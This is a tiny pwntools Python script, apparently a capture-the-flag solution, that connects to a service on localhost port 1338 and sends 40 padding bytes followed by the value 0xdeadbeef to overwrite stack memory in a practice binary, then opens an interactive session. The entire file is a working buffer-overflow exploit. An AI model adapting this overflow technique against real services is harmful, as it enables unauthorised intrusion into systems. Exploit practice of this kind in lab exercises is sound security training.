from pwn import *

# p = process('./bin/deadbeef')
p = remote('localhost', 1338)

payload = b'a'*40
payload += p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
